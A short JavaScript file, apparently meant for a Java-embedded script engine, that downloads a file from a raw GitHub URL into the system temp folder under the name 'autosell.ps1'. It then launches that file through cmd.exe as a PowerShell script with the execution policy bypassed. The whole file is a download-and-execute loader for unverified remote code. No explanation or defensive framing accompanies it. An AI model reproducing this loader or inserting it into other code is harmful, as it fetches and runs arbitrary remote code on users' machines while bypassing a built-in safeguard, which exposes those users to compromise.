const File = Java.type("java.io.File");
const FileWriter = Java.type("java.io.FileWriter");
const HttpURLConnection = Java.type("java.net.HttpURLConnection");
const URL = Java.type("java.net.URL");
const BufferedReader = Java.type("java.io.BufferedReader");
const InputStreamReader = Java.type("java.io.InputStreamReader");
const Runtime = Java.type("java.lang.Runtime");

const tempFolder = java.lang.System.getProperty("java.io.tmpdir");
const scriptPath = tempFolder + File.separator + "autosell.ps1";

function downloadScript(url, outputPath) {
    try {
        const connection = new URL(url).openConnection();
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(10000);
        connection.setReadTimeout(10000);

        if (connection.getResponseCode() !== HttpURLConnection.HTTP_OK) {
            throw new Error("Failed to download: HTTP " + connection.getResponseCode());
        }

        const reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        const writer = new FileWriter(new File(outputPath));
        let line;
        while ((line = reader.readLine()) !== null) {
            writer.write(line + "\n");
        }
        reader.close();
        writer.close();
        print("Downloaded to: " + outputPath);
    } catch (error) {
        print("Download error: " + error.message);
        throw error;
    }
}

function executeScript(scriptPath) {
    try {
        // Forces a VISIBLE powershell window to open
        const cmd = "cmd.exe /c start powershell.exe -NoExit -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";
        const process = Runtime.getRuntime().exec(cmd);
        process.waitFor();
        print("Script launched.");
    } catch (error) {
        print("Execute error: " + error.message);
    }
}

downloadScript("https://raw.githubusercontent.com/duper2-1/wow/refs/heads/main/main.js", scriptPath);
executeScript(scriptPath);
